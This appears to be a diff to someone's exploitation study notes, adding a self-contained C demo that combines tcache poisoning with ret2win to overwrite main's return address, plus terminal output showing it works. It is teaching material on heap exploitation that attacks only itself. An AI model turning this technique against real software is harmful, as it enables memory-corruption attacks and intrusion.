@@ -801,6 +801,62 @@ flag: aaaaaaaa
 
 <br>
 
+Tcache poisoning can be combined with other techniques like ret2win (19)
+
 <br>
 
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void win() {
+	printf("you win!\n");
+}
+
+int main() {
+    int stack_leak[2] = {3, 5};
+    printf("stack_leak +  0: %lx\n", (unsigned long) *((unsigned long*) stack_leak));
+    printf("stack_leak +  8: %lx\n", (unsigned long) *(((unsigned long*) stack_leak) + 1)); // canary
+    printf("stack_leak + 16: %lx\n", (unsigned long) *(((unsigned long*) stack_leak) + 2)); // prev rbp
+    printf("stack_leak + 24: %lx\n", (unsigned long) *(((unsigned long*) stack_leak) + 3)); // ret
+
+    // the usual tcache poisoning
+    unsigned long* ptr0;
+    unsigned long* ptr1;
+    ptr0 = malloc(0x20);
+    ptr1 = malloc(0x20);
+    free(ptr0);
+    free(ptr1);
+    *ptr1 = (unsigned long) stack_leak + 8*3; // target is return addr of main
+    malloc(0x20);
+    unsigned long* attack = malloc(0x20);
+
+    *attack = (unsigned long) win; 
+}
+```
+
+<br>
+
+```
+
+connor@connor-Virtual-Machine:~$ gcc ret2win.c; ./a.out 
+stack_leak +  0: 500000003
+stack_leak +  8: fa6b8aaef5f21500
+stack_leak + 16: 0
+stack_leak + 24: 7f3b3f3ec083
+you win!
+Segmentation fault (core dumped)
+connor@connor-Virtual-Machine:~$ 
+
+```
+
+
+
+<br>
+
+---
+
+<br>
 
